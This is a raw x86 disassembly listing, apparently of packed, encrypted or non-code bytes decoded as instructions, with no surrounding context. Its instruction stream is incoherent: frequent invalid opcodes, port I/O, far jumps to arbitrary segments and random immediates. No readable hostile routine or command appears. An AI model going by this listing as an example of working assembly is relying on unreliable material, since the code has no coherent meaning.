  416a65:	bound  ebp,QWORD PTR [ecx-0x20]
  416a68:	inc    ecx
  416a69:	outs   dx,DWORD PTR ds:[esi]
  416a6a:	in     eax,dx
  416a6b:	fcom   DWORD PTR [esi]
  416a6d:	push   ecx
  416a6e:	out    dx,eax
  416a6f:	loopne 0x416a00
  416a71:	fldcw  WORD PTR [ebx]
  416a73:	ficom  DWORD PTR [edi+0x5f]
  416a76:	out    dx,al
  416a77:	sbb    eax,0xf8b933b0
  416a7c:	pop    ss
  416a7d:	(bad)  
  416a7e:	fnsave [edx-0x31]
  416a81:	aam    0xac
  416a83:	pusha  
  416a84:	int3   
  416a85:	push   ebp
  416a86:	and    esi,DWORD PTR [eax-0x44]
  416a89:	cmp    al,0x28
  416a8b:	or     al,0xcc
  416a8d:	mov    al,ds:0x231aeab0
  416a92:	and    ah,dl
  416a94:	jbe    0x416a44
  416a96:	pusha  
  416a97:	sub    DWORD PTR [ecx-0x5ef30b29],ebp
  416a9d:	loopne 0x416aca
  416a9f:	clc    
  416aa0:	call   0xac7f24ee
  416aa5:	jb     0x416a93
  416aa7:	cdq    
  416aa8:	cmp    al,0x91
  416aaa:	push   ebx
  416aab:	loopne 0x416aa6
  416aad:	mov    ah,0xb7
  416aaf:	mov    ebp,0x57ccddab
  416ab4:	and    eax,0x9f9c9de
  416ab9:	into   
  416aba:	mov    bh,0x83
  416abc:	fistp  QWORD PTR [edi-0x6b]
  416abf:	dec    ecx
  416ac0:	dec    esi
  416ac1:	mov    esp,0xfdea1a55
  416ac6:	inc    edi
  416ac7:	repnz rol DWORD PTR [eax],1
  416aca:	dec    edi
  416acb:	inc    ebx
  416acc:	sbb    eax,0xa9d96e0c
  416ad1:	dec    ebp
  416ad2:	sahf   
  416ad3:	(bad)  
  416ad4:	cwde   
  416ad5:	rol    BYTE PTR [ebx-0x69ad80b5],0xf
  416adc:	repz es (bad) 
  416adf:	out    0x3a,al
  416ae1:	xor    ch,BYTE PTR [esi+0x2f780cab]
  416ae7:	jo     0x416aa9
  416ae9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416aea:	adc    eax,0xab77aa25
  416aef:	das    
  416af0:	push   edx
  416af1:	in     al,0x8f
  416af3:	arpl   WORD PTR [ebp-0x68],bx
  416af6:	dec    esp
  416af7:	xor    eax,0x2843266f
  416afc:	pop    edi
  416afd:	loope  0x416b63
  416aff:	sub    al,0xf6
  416b01:	aas    
  416b02:	jnp    0x416aac
  416b04:	cmp    BYTE PTR [ecx],al
  416b06:	mov    ah,dl
  416b08:	jp     0x416ac2
  416b0a:	sub    al,0x4
  416b0c:	adc    eax,0x7b75f381
  416b11:	pushf  
  416b12:	jno    0x416b2d
  416b14:	push   0x94b0ad53
  416b19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b1a:	pop    ecx
  416b1b:	jno    0x416ae1
  416b1d:	dec    ecx
  416b1e:	sub    DWORD PTR [ebp+0x305a4f10],eax
  416b24:	into   
  416b25:	sar    DWORD PTR [edx+edx*2],1
  416b28:	pop    edx
  416b29:	fisub  DWORD PTR [eax+0x6d16decc]
  416b2f:	mov    ds:0x2f791498,al
  416b34:	push   cs
  416b35:	sub    ch,BYTE PTR [ebx+0x14]
  416b38:	test   ch,bl
  416b3a:	push   esi
  416b3b:	push   ebp
  416b3c:	or     ebx,ebp
  416b3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b3f:	pusha  
  416b40:	sbb    eax,0xa7273efc
  416b45:	rcl    bl,cl
  416b47:	pop    ss
  416b48:	xchg   esi,eax
  416b49:	scas   eax,DWORD PTR es:[edi]
  416b4a:	mov    al,ds:0xffeba50e
  416b4f:	inc    edi
  416b50:	xchg   ecx,eax
  416b51:	mov    ds:0x5cc6fb76,eax
  416b56:	mov    edi,0xc174ebd0
  416b5b:	ror    esp,0x53
  416b5e:	mov    bh,0xa4
  416b60:	sahf   
  416b61:	pop    ecx
  416b62:	xlat   BYTE PTR ds:[ebx]
  416b63:	adc    DWORD PTR [ecx+edi*1-0x45],esp
  416b67:	ret    
  416b68:	call   0x63b3:0x8374986a
  416b6f:	rcr    BYTE PTR [ebp+0x4b],1
  416b72:	sub    bl,BYTE PTR [ebx-0x5b]
  416b75:	in     eax,0x83
  416b77:	inc    esi
  416b78:	mov    dh,0xb5
  416b7a:	scas   al,BYTE PTR es:[edi]
  416b7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b7c:	adc    al,0xb5
  416b7e:	xchg   ebx,eax
  416b7f:	repnz cmp bh,0x53
  416b83:	push   esi
  416b84:	js     0x416b25
  416b86:	ret    0xaa90
  416b89:	and    BYTE PTR [eax-0x7fe475e],dh
  416b8f:	pop    ecx
  416b90:	mov    al,0x26
  416b92:	sub    al,0x8e
  416b94:	data16 js 0x416b6a
  416b97:	pop    ebx
  416b98:	cmp    eax,0x9639ecdc
  416b9d:	sub    eax,0x8fd5e6fd
  416ba2:	retf   
  416ba3:	ja     0x416bb1
  416ba5:	xchg   esi,eax
  416ba6:	in     eax,dx
  416ba7:	lock and eax,0x399b9d26
  416bad:	xchg   esp,eax
  416bae:	das    
  416baf:	mov    edi,0x7e0dbe0
  416bb4:	or     BYTE PTR [edx],al
  416bb6:	fucomi st,st(2)
  416bb8:	sbb    ah,BYTE PTR [ecx]
  416bba:	jge    0x416bff
  416bbc:	stos   DWORD PTR es:[edi],eax
  416bbd:	ja     0x416bfa
  416bbf:	lock pushf 
  416bc1:	mov    ds:0x60af71b8,al
  416bc6:	pop    ebp
  416bc7:	ror    esi,0x77
  416bca:	mov    DWORD PTR [ebp-0xab6257f],eax
  416bd0:	jge    0x416c04
  416bd2:	imul   edi,DWORD PTR [edx+0x164754bc],0xf70432ac
  416bdc:	ja     0x416be6
  416bde:	jae    0x416bd8
  416be0:	fldcw  WORD PTR [esi]
  416be2:	cwde   
  416be3:	adc    BYTE PTR [ebx+ebx*2-0x1c],0xfa
  416be8:	arpl   ax,bp
  416bea:	adc    ebp,DWORD PTR [ecx-0x1a]
  416bed:	xlat   BYTE PTR ds:[ebx]
  416bee:	dec    eax
  416bef:	out    0xcf,al
  416bf1:	stos   DWORD PTR es:[edi],eax
  416bf2:	sbb    cl,dh
  416bf4:	and    BYTE PTR [ebp-0x7a64fe48],0x7d
  416bfb:	mov    esp,0xa9736265
  416c00:	ins    DWORD PTR es:[edi],dx
  416c01:	dec    ebx
  416c02:	shr    edi,cl
  416c04:	sbb    dh,BYTE PTR [ecx+eiz*8-0x5a]
  416c08:	fdiv   st,st(1)
  416c0a:	sbb    edi,esi
  416c0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c0d:	adc    DWORD PTR [eax],esp
  416c0f:	loop   0x416bf2
  416c11:	popf   
  416c12:	paddsb mm0,mm3
  416c15:	shl    BYTE PTR [esi-0x8e5d0c5],1
  416c1b:	xchg   BYTE PTR [ebx+0x7ade24bb],al
  416c21:	outs   dx,DWORD PTR ds:[esi]
  416c22:	ja     0x416bbf
  416c24:	add    ah,BYTE PTR [edx]
  416c26:	sub    al,0x93
  416c28:	stos   BYTE PTR es:[edi],al
  416c29:	add    ch,BYTE PTR ds:0xf951cac1
  416c2f:	push   esi
  416c30:	or     DWORD PTR [esi],esp
  416c32:	aas    
  416c33:	loopne 0x416c7a
  416c35:	lods   al,BYTE PTR ds:[esi]
  416c36:	pop    esi
  416c37:	or     al,0x60
  416c39:	test   esi,0x5e85b7bf
  416c3f:	outs   dx,BYTE PTR ds:[esi]
  416c40:	loop   0x416ca7
  416c42:	jno    0x416c43
  416c44:	int    0x5c
  416c46:	ficomp DWORD PTR [edx+0x27]
  416c49:	jno    0x416bed
  416c4b:	or     BYTE PTR [eax-0x3a],0x36
  416c4f:	je     0x416c02
  416c51:	dec    ecx
  416c52:	cwde   
  416c53:	shl    BYTE PTR ds:0xd3f52fc2,1
  416c59:	loopne 0x416cae
  416c5b:	retf   
  416c5c:	xchg   ecx,eax
  416c5d:	das    
  416c5e:	div    BYTE PTR [edx]
  416c60:	sub    BYTE PTR [ebx-0x71],0x97
  416c64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c65:	xor    eax,0x36999770
  416c6a:	nop
  416c6b:	in     eax,dx
  416c6c:	xchg   esp,eax
  416c6d:	mov    ebp,0xdfecece5
  416c72:	jo     0x416cc6
  416c74:	mov    dh,0xee
  416c76:	jmp    0x1330fa24
  416c7b:	adc    DWORD PTR [ebx+edx*1+0x7b],ecx
  416c7f:	fistp  WORD PTR ds:0x8070f05d
  416c85:	aam    0xe7
  416c87:	mov    bl,0xf
  416c89:	mov    edx,0xe1f9cfef
  416c8e:	icebp  
  416c8f:	aas    
  416c90:	lock aad 0xc7
  416c93:	outs   dx,DWORD PTR ds:[esi]
  416c94:	mov    dh,bh
  416c96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c97:	push   es
  416c98:	push   ss
  416c99:	stos   BYTE PTR es:[edi],al
  416c9a:	rcl    BYTE PTR [edi],cl
  416c9c:	sub    DWORD PTR [ecx-0x1873c139],0xd7fcbb49
  416ca6:	inc    eax
  416ca7:	icebp  
  416ca8:	(bad)  
  416ca9:	mov    bl,0xc4
  416cab:	sbb    BYTE PTR [ebx-0xd],bh
  416cae:	popa   
  416caf:	xchg   BYTE PTR [edx-0x476c5317],dl
  416cb5:	and    BYTE PTR [ecx+0x1532fd77],cl
  416cbb:	lds    ebp,FWORD PTR [ecx]
  416cbd:	xchg   esp,eax
  416cbe:	or     DWORD PTR [edx-0x1d66b524],ebp
  416cc4:	int3   
  416cc5:	sti    
  416cc6:	call   0x24065511
  416ccb:	ret    
  416ccc:	and    eax,0x8e64f2ab
  416cd1:	mov    DWORD PTR [eax+0x38],esp
  416cd4:	pusha  
  416cd5:	jmp    DWORD PTR [edx+0x5]
  416cd8:	lea    ecx,[ecx-0xf8f6c35]
  416cde:	cmp    bl,BYTE PTR [edx+0x554126d5]
  416ce4:	push   ebx
  416ce5:	push   esp
  416ce6:	push   ss
  416ce7:	mul    BYTE PTR [edi+0xa39455e]
  416ced:	add    esi,DWORD PTR [edi+0x622eedbe]
  416cf3:	jp     0x416d57
  416cf5:	xchg   bl,ah
  416cf7:	out    dx,eax
  416cf8:	jge    0x416d73
  416cfa:	xchg   esi,eax
  416cfb:	ja     0x416c95
  416cfd:	ja     0x416c9a
  416cff:	(bad)  
  416d00:	and    eax,ebp
  416d02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d03:	xchg   ebp,eax
  416d05:	popa   
  416d06:	push   edi
  416d07:	jle    0x416d6a
  416d09:	test   BYTE PTR [ebx+0x28],dh
  416d0c:	push   cs
  416d0d:	xor    BYTE PTR [esp+ecx*1+0x43],dh
  416d11:	iret   
  416d12:	inc    esi
  416d13:	adc    ecx,esp
  416d15:	ja     0x416d13
  416d17:	scas   eax,DWORD PTR es:[edi]
  416d18:	shl    DWORD PTR [ecx],cl
  416d1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d1b:	xchg   DWORD PTR [ecx-0x3a547cbd],ecx
  416d21:	mov    esp,0x9ea56fa0
  416d26:	jecxz  0x416d2f
  416d28:	mov    DWORD PTR [edx-0xf],esp
  416d2b:	xor    al,0xfc
  416d2d:	and    bh,bh
  416d2f:	std    
  416d30:	fistp  WORD PTR [edx-0x599d5aef]
  416d36:	inc    eax
  416d37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d38:	into   
  416d39:	dec    edi
  416d3a:	inc    esi
  416d3b:	arpl   WORD PTR ds:0x511597c7,si
  416d41:	daa    
  416d42:	cmp    dl,dl
  416d44:	mov    ebx,0xd5f3cfbb
  416d49:	ret    
  416d4a:	test   eax,0x61e90ec7
  416d4f:	dec    esi
  416d50:	push   ss
  416d51:	in     eax,0x99
  416d53:	ret    
  416d54:	mov    bh,0x18
  416d56:	in     al,dx
  416d57:	mov    dl,0xf
  416d59:	ret    
  416d5a:	adc    eax,0x31e23340
  416d5f:	jne    0x416d38
  416d61:	push   ebx
  416d62:	push   ebx
  416d63:	popa   
  416d64:	shr    BYTE PTR [edx+0xaaa11ed],1
  416d6a:	inc    ecx
  416d6b:	inc    esp
  416d6c:	aas    
  416d6d:	adc    edi,edi
  416d6f:	cmc    
  416d70:	ficom  DWORD PTR [edi+0x54]
  416d73:	iret   
  416d74:	or     al,0xd7
  416d76:	xor    ebp,DWORD PTR [ebx-0x102cc14e]
  416d7c:	stc    
  416d7d:	adc    BYTE PTR [ecx+0xf00c00],dl
  416d83:	push   ebp
  416d84:	repz or ebp,DWORD PTR [ebx+0x5ee29bd9]
  416d8b:	ja     0x416d37
  416d8d:	clc    
  416d8e:	pusha  
  416d8f:	mov    bh,0x26
  416d91:	mov    edx,DWORD PTR [edi]
  416d93:	aam    0xbc
  416d95:	dec    esp
  416d96:	in     al,dx
  416d97:	fisubr WORD PTR [ebx+0x57]
  416d9a:	cmp    eax,0xe86eb894
  416d9f:	nop
  416da0:	call   0xca76:0xfad2ff0e
  416da7:	aad    0x87
  416da9:	scas   eax,DWORD PTR es:[edi]
  416daa:	pop    ebp
  416dab:	daa    
  416dac:	inc    ebx
  416dad:	hlt    
  416dae:	inc    ebp
  416daf:	or     ah,BYTE PTR [ecx]
  416db1:	push   esp
  416db2:	cmp    ch,BYTE PTR [eax-0xf]
  416db5:	inc    esi
  416db6:	ins    DWORD PTR es:[edi],dx
  416db7:	push   ebp
  416db8:	imul   eax,DWORD PTR [edx-0x23],0x130113f9
  416dbf:	(bad)  
  416dc0:	xchg   ebx,eax
  416dc1:	push   ebp
  416dc2:	fldenv [esi-0x6f19584e]
  416dc8:	cmp    al,BYTE PTR [esi-0x5]
  416dcb:	xchg   edx,eax
  416dcc:	fld    QWORD PTR [edx+0x769e218e]
  416dd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416dd3:	and    BYTE PTR [edx],al
  416dd5:	repnz aas 
  416dd7:	(bad)  
  416dd8:	adc    eax,0x5e6fe03a
  416ddd:	and    eax,DWORD PTR [edx-0x7f]
  416de0:	add    bl,BYTE PTR [edi-0x4d591222]
  416de6:	das    
  416de7:	(bad)  
  416de8:	call   0xcd29038e
  416ded:	xor    DWORD PTR [edi+0x22],edx
  416df0:	je     0x416d8b
  416df2:	mul    BYTE PTR [ecx-0x6b912172]
  416df8:	retf   0xb483
  416dfb:	add    al,0x30
  416dfd:	aam    0x29
  416dff:	lock jle 0x416e54
  416e02:	retf   0x2ded
  416e05:	xchg   edi,eax
  416e06:	inc    ebp
  416e07:	mov    esi,0x8a48ede5
  416e0c:	cmp    WORD PTR [esi-0x4a85bcdf],bp
  416e13:	cmp    cl,BYTE PTR [edx-0x6b]
  416e16:	push   ecx
  416e17:	or     al,0x60
  416e19:	jnp    0x416dec
  416e1b:	stos   DWORD PTR es:[edi],eax
  416e1c:	mov    cl,0x8a
  416e1e:	mov    dh,0xb
  416e20:	dec    edx
  416e21:	jno    0x416e8d
  416e23:	mov    edi,0x4d575bc0
  416e28:	popf   
  416e29:	mov    ebx,0x58bad9aa
  416e2e:	ins    DWORD PTR es:[edi],dx
  416e2f:	outs   dx,DWORD PTR ds:[esi]
  416e30:	aas    
  416e31:	mov    ah,0xd3
  416e33:	ins    BYTE PTR es:[edi],dx
  416e34:	jno    0xc4c60068
  416e3a:	call   0x9464:0xcf5f08ca
  416e41:	cld    
  416e42:	cmp    eax,0x56e3e00d
  416e47:	imul   edi,DWORD PTR [esi],0xd796db99
  416e4d:	je     0x416df4
  416e4f:	ret    0xbe1d
  416e52:	jg     0x416e66
  416e54:	lock mov ebx,0xc1bc4524
  416e5a:	xor    DWORD PTR [ecx],eax
  416e5c:	inc    esi
  416e5d:	pop    eax
  416e5e:	lods   eax,DWORD PTR ds:[esi]
  416e5f:	and    esi,DWORD PTR [edi]
  416e61:	jne    0x416eca
  416e63:	ror    DWORD PTR [ebp-0xb655300],cl
  416e69:	aas    
  416e6a:	push   es
  416e6b:	add    ah,dl
  416e6d:	jns    0x416ea1
  416e6f:	pop    es
  416e70:	adc    BYTE PTR [ebx+0x5f],cl
  416e73:	jbe    0x416eb4
  416e75:	xor    DWORD PTR [ebx],eax
  416e77:	bound  ebp,QWORD PTR [esi]
  416e79:	adc    eax,0x4ac29956
  416e7e:	in     al,0x59
  416e80:	gs pop esp
  416e82:	push   edx
  416e83:	pop    ds
  416e84:	int3   
  416e85:	mov    dl,0xe3
  416e87:	and    edx,edi
  416e89:	add    DWORD PTR [ecx],edx
  416e8b:	outs   dx,BYTE PTR ds:[esi]
  416e8c:	jbe    0x416e98
  416e8e:	std    
  416e8f:	rcr    DWORD PTR [edx-0x8],0xd6
  416e93:	fst    QWORD PTR [ecx+0x506460f4]
  416e99:	mov    dh,0x50
  416e9b:	or     DWORD PTR ds:0x23244649,0x12
  416ea2:	mov    esi,0x5c0c090a
  416ea7:	retf   0x9b43
  416eaa:	sub    ecx,esi
  416eac:	xor    eax,esi
  416eae:	jp     0x416f25
  416eb0:	dec    edi
  416eb1:	ins    DWORD PTR es:[edi],dx
  416eb2:	xor    ebp,0x1e
  416eb5:	mov    al,0xd7
  416eb7:	inc    esi
  416eb8:	ja     0x416e72
  416eba:	out    0xa2,al
  416ebc:	inc    ebp
  416ebd:	test   al,0xb5
  416ebf:	(bad)  
  416ec0:	and    al,0x40
  416ec2:	popa   
  416ec3:	xchg   cl,bl
  416ec5:	fcomp  QWORD PTR [esi+0x1171bf2e]
  416ecb:	adc    ecx,edi
  416ecd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ece:	inc    eax
  416ecf:	pop    ds
  416ed0:	(bad)  
  416ed1:	cli    
  416ed2:	xchg   ebp,eax
  416ed3:	repz inc edi
  416ed5:	push   esi
  416ed6:	(bad)  
  416ed7:	out    0x5c,eax
  416ed9:	sub    cl,ah
  416edb:	inc    ebx
  416edc:	xchg   ebx,eax
  416edd:	inc    esp
  416ede:	je     0x416f50
  416ee0:	xchg   ebx,eax
  416ee1:	sub    cl,BYTE PTR es:[esi+0x451a4a87]
  416ee8:	pusha  
  416ee9:	cmp    DWORD PTR [edx],esp
  416eeb:	ja     0x416eb4
  416eed:	fild   DWORD PTR [edx+0x823da6c]
  416ef3:	stos   DWORD PTR es:[edi],eax
  416ef4:	push   edx
  416ef5:	mov    eax,0x79082328
  416efa:	xor    esp,DWORD PTR [ecx+0x7886f051]
  416f00:	and    DWORD PTR [ecx+0x3d2e7a07],esp
  416f06:	mov    esp,0xdb3f9b
  416f0b:	test   eax,0xe6155181
  416f10:	clc    
  416f11:	in     eax,0xd8
  416f13:	sbb    cl,BYTE PTR [ebx]
  416f15:	xchg   BYTE PTR [edx],ch
  416f17:	dec    ecx
  416f18:	scas   eax,DWORD PTR es:[edi]
  416f19:	daa    
  416f1a:	mov    bl,0x7d
  416f1c:	pop    ecx
  416f1d:	sbb    ch,BYTE PTR [eax-0x2ccd1a4]
  416f23:	(bad)  
  416f24:	jle    0x416ebc
  416f26:	cmp    ch,BYTE PTR [ecx]
  416f28:	ins    DWORD PTR es:[edi],dx
  416f29:	mov    WORD PTR [eax+ecx*8],?
  416f2c:	icebp  
  416f2d:	sub    DWORD PTR [edi],esi
  416f2f:	add    ch,BYTE PTR [ecx]
  416f31:	push   ebp
  416f32:	lods   eax,DWORD PTR ds:[esi]
  416f33:	test   DWORD PTR [edx+ebx*4],esi
  416f36:	ss inc ecx
  416f38:	inc    esi
  416f39:	dec    esp
  416f3a:	sub    esi,esp
  416f3c:	sbb    ecx,esp
  416f3e:	mov    bl,0x99
  416f40:	cli    
  416f41:	pop    es
  416f42:	or     al,BYTE PTR [edx+0x77ab6217]
  416f48:	and    BYTE PTR [eax],bl
  416f4a:	sbb    al,0x97
  416f4c:	push   ecx
  416f4d:	add    DWORD PTR [eax+0x5f45c2a9],ebx
  416f53:	sub    al,0x52
  416f55:	loopne 0x416f6c
  416f57:	stos   DWORD PTR es:[edi],eax
  416f58:	adc    esp,ecx
  416f5a:	pop    es
  416f5b:	(bad)  
  416f5d:	nop
  416f5e:	je     0x416ef3
  416f60:	sub    dh,dh
  416f62:	pop    ecx
  416f63:	mov    WORD PTR [edi-0x3de35369],?
  416f69:	xchg   edi,eax
  416f6a:	es jmp 0x8b3f:0xe5244e54
  416f72:	pop    edi
  416f73:	adc    ecx,ebp
  416f75:	mov    fs:0xbe5b6688,eax
  416f7b:	test   DWORD PTR [edx-0x4d],eax
  416f7e:	scas   al,BYTE PTR es:[edi]
  416f7f:	ret    0x94d7
  416f82:	push   esi
  416f83:	call   0xabc5:0xb619ecd2
  416f8a:	jmp    0x38d2:0x9eb64af
  416f91:	lea    edx,[ecx+0x4f]
  416f94:	pop    es
  416f95:	xchg   edi,eax
  416f96:	pop    esi
  416f97:	adc    DWORD PTR [ebp+0x7f],esp
  416f9a:	dec    ebx
  416f9b:	pop    ecx
  416f9c:	xor    eax,0xb62682fb
  416fa1:	push   ebp
  416fa2:	(bad)  
  416fa3:	xor    ecx,esi
  416fa5:	sar    DWORD PTR [edi],1
  416fa7:	jge    0x416fb0
  416fa9:	adc    ah,ch
  416fab:	or     ch,BYTE PTR [ebp+0x5a]
  416fae:	mov    esi,0x66d08187
  416fb3:	mov    cl,0xbe
  416fb5:	das    
  416fb6:	adc    BYTE PTR [esi-0x2a844c23],al
  416fbc:	dec    esp
  416fbd:	dec    esi
  416fbe:	inc    edx
  416fbf:	je     0x416f67
  416fc1:	cli    
  416fc2:	and    ah,BYTE PTR [eax]
  416fc4:	or     esp,DWORD PTR [ebp-0x7053e8d4]
  416fca:	or     DWORD PTR [ebp+0x23],0x766bc351
  416fd1:	mov    cl,0x50
  416fd3:	fiadd  DWORD PTR [eax-0x47]
  416fd6:	cmp    dh,BYTE PTR [eax+0x50]
  416fd9:	xor    dh,0x83
  416fdc:	mov    bl,0xe9
  416fde:	pusha  
  416fdf:	mov    ebp,0xdde1f100
  416fe4:	jmp    0x1ef5e4a6
  416fe9:	scas   eax,DWORD PTR es:[edi]
  416fea:	and    DWORD PTR [edx+0x22],0x6ba6f449
  416ff1:	outs   dx,BYTE PTR ds:[esi]
  416ff2:	cli    
  416ff3:	pop    ebp
  416ff4:	lds    esp,FWORD PTR [edx-0x37c4d626]
  416ffa:	cmp    DWORD PTR [edi-0x55aeada2],0x9f01954f
  417004:	hlt    
  417005:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417006:	lds    esp,FWORD PTR [ecx+0x2b68c446]
  41700c:	sub    BYTE PTR ds:0xfac9457e,al
  417012:	icebp  
  417013:	push   edx
  417014:	je     0x417015
  417016:	in     al,dx
  417017:	cwde   
  417018:	fst    QWORD PTR [ecx+0x2c30a65c]
  41701e:	push   ebx
  41701f:	mov    ah,0x1b
  417021:	pop    eax
  417022:	add    BYTE PTR [ebp-0x3b],cl
  417025:	mov    al,0xd8
  417027:	aam    0x13
  417029:	sub    ah,BYTE PTR [eax+eax*2-0x2376cc96]
  417030:	jns    0x4170b1
  417032:	fiadd  DWORD PTR [edi]
  417034:	and    eax,edi
  417036:	jl     0x417064
  417038:	inc    esi
  417039:	int3   
  41703a:	fs push eax
  41703c:	xchg   edx,eax
  41703d:	fmul   DWORD PTR [edx+ecx*2-0x2d43039d]
  417044:	xchg   ah,cl
  417046:	xlat   BYTE PTR ds:[ebx]
  417047:	ja     0x41700f
  417049:	fisub  WORD PTR [edx]
  41704b:	and    DWORD PTR [ebp-0x57],0x56
  41704f:	lahf   
  417050:	mov    eax,ss
  417052:	jg     0x417026
  417054:	adc    BYTE PTR [esi-0x48bce15b],0xfb
  41705b:	scas   al,BYTE PTR es:[edi]
  41705c:	mov    al,bl
  41705e:	xchg   edi,eax
  41705f:	mov    cs,WORD PTR [edi]
  417061:	cmp    ebx,DWORD PTR [ecx-0x447186dc]
  417067:	adc    eax,0x22129d1
  41706c:	inc    ebx
  41706d:	stos   BYTE PTR es:[edi],al
  41706e:	add    eax,0xdd050ed7
  417073:	ret    0x8c37
  417076:	adc    al,0x9a
  417078:	push   ss
  417079:	adc    eax,0xf154155c
  41707e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41707f:	retf   
  417080:	mov    ecx,esp
  417082:	cmp    eax,0x3108e112
  417087:	dec    edi
  417088:	xor    bl,BYTE PTR [ebp-0x12]
  41708b:	aaa    
  41708c:	pusha  
  41708d:	iret   
  41708e:	repz sbb BYTE PTR [ebp-0x6],dh
  417092:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417093:	sub    edi,edi
  417095:	or     DWORD PTR [esi-0x64a5b702],edi
  41709b:	mov    ch,BYTE PTR [edi-0x4d50d88f]
  4170a1:	sub    al,0x50
  4170a3:	and    dl,BYTE PTR [esi-0x1fdbb9d5]
  4170a9:	xor    eax,0x64631744
  4170ae:	shl    DWORD PTR [edx],0xe9
  4170b1:	sahf   
  4170b2:	jb     0x417035
  4170b4:	and    edi,ebx
  4170b6:	sbb    ecx,edx
  4170b8:	mov    al,ds:0x9fa05b34
  4170bd:	xor    al,BYTE PTR [ebx]
  4170bf:	jp     0x4170ac
  4170c1:	mov    eax,ds:0x58b8eff0
  4170c6:	shl    BYTE PTR [ebx+ecx*4],cl
  4170c9:	out    0xe8,al
  4170cb:	outs   dx,DWORD PTR ds:[esi]
  4170cc:	xlat   BYTE PTR ds:[ebx]
  4170cd:	mov    ds:0xb1b72677,eax
  4170d2:	loop   0x4170c3
  4170d4:	adc    al,0xeb
  4170d6:	push   ecx
  4170d7:	pop    edx
  4170d8:	sub    al,0x69
  4170da:	ds out 0x60,al
  4170dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170de:	or     eax,0x42589cec
  4170e3:	jmp    0x8cc8449f
  4170e8:	cmp    eax,0xa35df45d
  4170ed:	leave  
  4170ee:	in     eax,0x36
  4170f0:	push   ds
  4170f1:	sbb    edx,ebx
  4170f3:	cmp    BYTE PTR [esi+0x31],0x24
  4170f7:	jmp    0x4170e7
  4170f9:	mov    bh,0xe8
  4170fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170fc:	fsub   st(1),st
  4170fe:	loop   0x41709a
  417100:	test   eax,0xcc7b3621
  417106:	mov    esp,0xf663e8ec
  41710b:	out    dx,al
  41710c:	push   es
  41710d:	inc    ecx
  41710e:	mov    al,0x5d
  417110:	ds add al,0xba
  417113:	dec    eax
  417114:	mov    ds:0x4e9f69e5,al
  417119:	cwde   
  41711a:	jg     0x417148
  41711c:	nop
  41711d:	adc    DWORD PTR [esi-0x60],eax
  417120:	(bad)  
  417123:	push   esi
  417124:	(bad)  
  417125:	jae    0x417183
  417127:	push   edx
  417128:	xor    ecx,DWORD PTR ds:0xde3d8d54
  41712e:	(bad)  [ecx-0xaf9d684]
  417134:	retf   0xfe9
  417137:	add    ah,ah
  417139:	addr16 aaa 
  41713b:	xor    esp,DWORD PTR [esi-0x2a]
  41713e:	les    ebx,FWORD PTR [ecx+0x35]
  417141:	add    dl,BYTE PTR [edx]
  417143:	pop    ebx
  417144:	or     edi,DWORD PTR [edx-0x3b]
  417147:	ret    
  417148:	xor    al,0xca
  41714a:	fnstcw WORD PTR [ebp-0x5210ca08]
  417150:	popf   
  417151:	out    dx,eax
  417152:	mov    ds:0x7449e7d,eax
  417157:	pop    ebp
  417158:	in     al,dx
  417159:	sub    BYTE PTR [eax],al
  41715b:	lock push 0x1ff8b712
  417161:	ins    DWORD PTR es:[edi],dx
  417162:	dec    edx
  417163:	fistp  DWORD PTR [edx+0x61cedded]
  417169:	push   0x864b27aa
  41716e:	add    bh,dl
  417170:	loop   0x41718a
  417172:	fwait
  417173:	mov    esi,0xced63baf
  417178:	dec    esp
  417179:	mov    ecx,0x40d75358
  41717e:	add    al,0x6e
  417180:	int3   
  417181:	leave  
  417182:	or     al,0x74
  417184:	jl     0x4171b4
  417186:	xchg   DWORD PTR [edi+esi*1-0x43],edi
  41718a:	(bad)  
  41718c:	fnsave [ecx]
  41718e:	mov    al,0xf8
  417190:	out    0xc1,eax
  417192:	in     eax,0x26
  417194:	(bad)  
  417195:	adc    bl,BYTE PTR [edi-0xb]
  417198:	idiv   DWORD PTR ds:0x9a7b
  41719d:	and    ch,cl
  41719f:	push   edx
  4171a0:	punpckhdq mm5,QWORD PTR [ebp-0x39684f8f]
  4171a7:	push   cs
  4171a8:	in     eax,0xc6
  4171aa:	mov    WORD PTR [ebp-0x19a18bae],gs
  4171b0:	nop
  4171b1:	mov    ds:0x4336cd0e,eax
  4171b6:	sub    DWORD PTR [edi+0x5e],edi
  4171b9:	scas   eax,DWORD PTR es:[edi]
  4171ba:	mov    cl,0x5
  4171bc:	test   DWORD PTR [ecx+0x34],esp
  4171bf:	jmp    0x4171fa
  4171c1:	pop    eax
  4171c2:	call   0x448f352d
  4171c7:	xchg   edi,eax
  4171c8:	push   ds
  4171c9:	dec    eax
  4171ca:	inc    ebp
  4171cb:	add    eax,0x97f42823
  4171d0:	loope  0x4171be
  4171d2:	sub    al,0x6d
  4171d4:	fsub   QWORD PTR [ebp+0x42]
  4171d7:	inc    esp
  4171d8:	repz mov ebp,0x4c92065a
  4171de:	mov    eax,ds:0xabdab605
  4171e3:	add    DWORD PTR [edx],eax
  4171e5:	into   
  4171e6:	(bad)  
  4171e7:	aad    0x8d
  4171e9:	mov    edx,0x137a2ff1
  4171ee:	pop    edx
  4171ef:	retf   0xbdb
  4171f2:	mov    BYTE PTR [ecx-0x112d835d],al
  4171f8:	jbe    0x41726c
  4171fa:	push   ss
  4171fb:	test   eax,0x22b2e093
  417200:	xor    ch,BYTE PTR [ecx]
  417202:	pop    eax
  417203:	loope  0x4171a4
